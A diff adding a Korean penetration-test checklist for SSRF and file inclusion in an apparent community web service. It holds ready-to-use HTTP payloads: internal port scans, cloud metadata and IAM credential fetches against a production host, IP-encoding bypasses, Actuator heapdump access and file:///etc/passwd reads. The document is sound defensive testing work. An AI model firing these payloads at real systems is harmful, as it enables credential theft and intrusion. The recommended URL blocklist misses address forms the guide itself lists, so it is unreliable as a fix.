@@ -1,0 +1,314 @@
+================================================================================
+[VCE-CM-04] SSRF/File Inclusion 공격 가능성
+도메인: community
+위험도: High
+================================================================================
+
+1. 진단 항목 개요
+--------------------------------------------------------------------------------
+SSRF(Server-Side Request Forgery)는 공격자가 서버 측에서 외부 또는 내부
+리소스로 HTTP 요청을 강제 발생시키는 취약점이다. 서버가 사용자 제공 URL을
+직접 요청하는 경우(이미지 프록시, URL 미리보기, OGP 파싱 등) 발생하며,
+클라우드 메타데이터 서버 접근, 내부 서비스 스캔, SSRF를 통한 RCE 등으로
+이어질 수 있다.
+
+File Inclusion은 서버가 사용자 지정 경로의 파일을 포함(include)하여 실행하는
+취약점으로, LFI(Local File Inclusion)와 RFI(Remote File Inclusion)로 구분된다.
+
+VCE 커뮤니티에서의 SSRF 위험 지점:
+  - 게시글 content에 외부 URL이 포함될 경우 서버 측에서 URL을 요청하는지 여부
+  - 이미지 URL 미리보기(OGP) 기능에서 사용자 제공 URL을 직접 요청
+  - 파일 업로드 후 /uploads 경로를 통한 내부 파일 접근
+
+영향 범위:
+  - 내부 서비스 포트 스캔 (localhost:3306, localhost:6379 등)
+  - AWS/GCP 메타데이터 서버 접근 (IAM 자격증명 탈취)
+  - 내부 관리 콘솔 접근 (Actuator, Kibana, Grafana 등)
+  - 파일 시스템 내 민감 파일 읽기 (application.properties 등)
+
+
+2. 대상 기능 & 엔드포인트
+--------------------------------------------------------------------------------
+대상 기능:
+  - 게시글 content 내 이미지 URL 처리
+  - OGP(Open Graph Protocol) 미리보기 기능 (있을 경우)
+  - 파일 업로드 후 파일 접근 경로
+
+주요 엔드포인트:
+  POST /api/community/posts          - content에 URL 포함하여 게시
+  GET  /api/community/ogp?url={url}  - URL 미리보기 (있을 경우)
+  GET  /uploads/{filename}           - 업로드 파일 접근
+  POST /api/community/uploads        - 파일 업로드
+
+접근 URL (로컬):
+  http://localhost:8080/api/community/posts
+  http://localhost:8080/uploads/
+
+
+3. 취약점 원리 (Why this works)
+--------------------------------------------------------------------------------
+[SSRF 원리]
+서버가 사용자 입력 URL로 HTTP 요청을 발생시키는 경우:
+  - 서버의 IP로 요청이 발생 → 내부 방화벽 우회 가능
+  - localhost, 127.0.0.1, 169.254.169.254 등 외부에서 접근 불가한 주소에 도달
+  - 클라우드 환경에서 인스턴스 메타데이터(AWS IMDSv1) 접근
+
+공격 흐름 (OGP 기능 예시):
+  1. 공격자가 url=http://169.254.169.254/latest/meta-data/ 전달
+  2. 서버가 해당 URL로 HTTP GET 요청 발생
+  3. AWS 메타데이터 응답을 공격자에게 반환
+  4. IAM Role 크리덴셜(AccessKeyId, SecretAccessKey) 탈취
+
+[File Inclusion 원리]
+파일 경로를 사용자 입력으로 구성하는 경우:
+  - 정상: /uploads/image.jpg
+  - 공격: /uploads/../config/application.properties
+  - 실제 접근: /config/application.properties (상위 디렉토리 탈출)
+
+
+4. 테스트 절차 (Step-by-step)
+--------------------------------------------------------------------------------
+
+[STEP 1] SSRF 탐지 - OGP/URL 미리보기 기능 확인
+
+1-1. 개발자도구(F12) > Network 탭에서 게시글 작성 시 요청 모니터링
+1-2. Burp Suite로 게시글 작성 요청 캡처
+
+게시글 내 URL 포함 테스트:
+------------------------------------------------------------------------
+POST /api/community/posts HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+{
+  "title": "SSRF 테스트",
+  "content": "아래 링크를 확인하세요: http://localhost:3306",
+  "categoryId": 1
+}
+------------------------------------------------------------------------
+
+OGP 엔드포인트 직접 테스트 (있을 경우):
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://localhost:8080/actuator/env HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+[STEP 2] 내부 서비스 포트 스캔 (SSRF를 통한 내부망 스캔)
+
+Burp Suite Intruder 설정:
+  - Target: GET /api/community/ogp?url=http://localhost:§PORT§/
+  - Payload: 숫자 범위 1 ~ 65535 (또는 주요 포트 목록)
+
+주요 포트 목록:
+  21     FTP
+  22     SSH
+  80     HTTP
+  443    HTTPS
+  3306   MySQL
+  5432   PostgreSQL
+  6379   Redis
+  8080   Tomcat/Spring
+  8443   HTTPS 대안
+  9200   Elasticsearch
+  27017  MongoDB
+
+Burp Repeater - 주요 포트 직접 테스트:
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://127.0.0.1:3306 HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://127.0.0.1:6379 HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://127.0.0.1:9200 HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+판단: 응답 시간 차이 또는 에러 메시지 차이로 포트 오픈 여부 추측
+
+[STEP 3] 클라우드 메타데이터 서버 접근 (운영 환경 대상)
+
+AWS IMDSv1 메타데이터:
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: vceapp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+AWS IAM 자격증명 접근:
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: vceapp.com
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+GCP 메타데이터:
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
+Host: vceapp.com
+Metadata-Flavor: Google
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+[STEP 4] SSRF URL 우회 기법
+
+직접 IP 차단 우회 (DNS Rebinding / IP 변환):
+  - http://127.0.0.1 → http://2130706433 (10진수)
+  - http://127.0.0.1 → http://0x7F000001 (16진수)
+  - http://127.0.0.1 → http://0177.0.0.1 (8진수)
+  - http://localhost → http://LOCALHOST (대소문자)
+  - http://localhost → http://localtest.me (DNS → 127.0.0.1)
+
+URL 우회 페이로드:
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://2130706433:8080/actuator HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://0x7F000001:8080/actuator HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+[STEP 5] Spring Actuator 엔드포인트 접근 시도
+
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://localhost:8080/actuator HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://localhost:8080/actuator/env HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /api/community/ogp?url=http://localhost:8080/actuator/heapdump HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+기대 결과 (취약):
+  - Actuator 응답(환경 변수, DB 연결 정보 등)이 응답 본문에 포함
+
+[STEP 6] file:// 프로토콜 삽입 (LFI)
+
+------------------------------------------------------------------------
+GET /api/community/ogp?url=file:///etc/passwd HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+------------------------------------------------------------------------
+GET /api/community/ogp?url=file:///Users/user/application.properties HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+------------------------------------------------------------------------
+
+[STEP 7] 게시글 content에 외부 이미지 URL 삽입 후 서버 측 요청 여부 확인
+
+Burp Collaborator를 활용한 SSRF 탐지:
+  7-1. Burp Suite > Collaborator 탭에서 Collaborator 도메인 생성
+       예: abc123.burpcollaborator.net
+  7-2. 게시글 content에 해당 도메인 이미지 URL 포함:
+
+------------------------------------------------------------------------
+POST /api/community/posts HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+
+{
+  "title": "SSRF Collaborator 테스트",
+  "content": "<img src='http://abc123.burpcollaborator.net/ssrf-test.jpg'>",
+  "categoryId": 1
+}
+------------------------------------------------------------------------
+
+  7-3. Burp Collaborator에서 HTTP 요청 수신 여부 확인
+  7-4. 서버 IP에서 요청이 오면 SSRF 확정
+
+
+5. 취약 여부 판단 기준
+--------------------------------------------------------------------------------
+취약 (아래 중 하나라도 해당):
+  - OGP 또는 URL 처리 엔드포인트에서 내부 URL(localhost, 127.0.0.1)로 요청 발생
+  - 메타데이터 서버(169.254.169.254) 응답 내용이 반환됨
+  - Actuator 환경 변수 또는 내부 서비스 응답이 포함됨
+  - Burp Collaborator에 서버 IP로부터 HTTP 요청 수신
+  - file:// 프로토콜로 파일 내용이 반환됨
+  - 포트 별 응답 시간 차이로 내부 서비스 포트 스캔 가능
+
+안전 (아래 모두 해당 시):
+  - 내부 IP/도메인 URL은 요청 거부 (화이트리스트 검증)
+  - 허용 URL 스킴을 http/https만으로 제한
+  - URL에 localhost, 127.0.0.1, 10.x, 192.168.x, 169.254.x 포함 시 차단
+  - OGP 기능이 없거나 서버 측 URL 요청 자체가 발생하지 않음
+
+
+6. 예상 취약 포인트 (코드 위치)
+--------------------------------------------------------------------------------
+파일: backend/src/main/java/.../community/service/OgpService.java (있을 경우)
+  - URL url = new URL(targetUrl); url.openConnection(); 패턴
+  - RestTemplate 또는 WebClient로 사용자 제공 URL 직접 요청
+
+파일: backend/src/main/java/.../file/service/FileService.java
+  - 업로드된 파일의 경로 처리에서 Path Traversal 가능 지점
+
+
+7. 권고 조치
+--------------------------------------------------------------------------------
+[SSRF 대응]
+1. URL 화이트리스트 검증
+   private boolean isAllowedUrl(String url) {
+     URI uri = new URI(url);
+     String host = uri.getHost();
+     // 내부 IP 대역 차단
+     if (host.equals("localhost") || host.startsWith("127.") ||
+         host.startsWith("10.") || host.startsWith("192.168.") ||
+         host.equals("169.254.169.254")) {
+       throw new IllegalArgumentException("허용되지 않은 URL");
+     }
+     return true;
+   }
+
+2. 허용 스킴 제한 (http/https만 허용)
+   if (!uri.getScheme().matches("https?")) {
+     throw new IllegalArgumentException("지원하지 않는 프로토콜");
+   }
+
+3. 서버 측 URL 요청 기능 자체를 제거하거나 CDN 프록시로 대체
+
+4. AWS IMDSv2 강제 적용 (클라우드 환경)
+   - IMDSv1 비활성화로 메타데이터 서버 직접 접근 차단
+
+[File Inclusion 대응]
+1. 파일 경로 검증
+   Path uploadDir = Paths.get("/uploads").toAbsolutePath().normalize();
+   Path filePath = uploadDir.resolve(filename).normalize();
+   if (!filePath.startsWith(uploadDir)) {
+     throw new SecurityException("허용되지 않은 경로");
+   }
+
+================================================================================
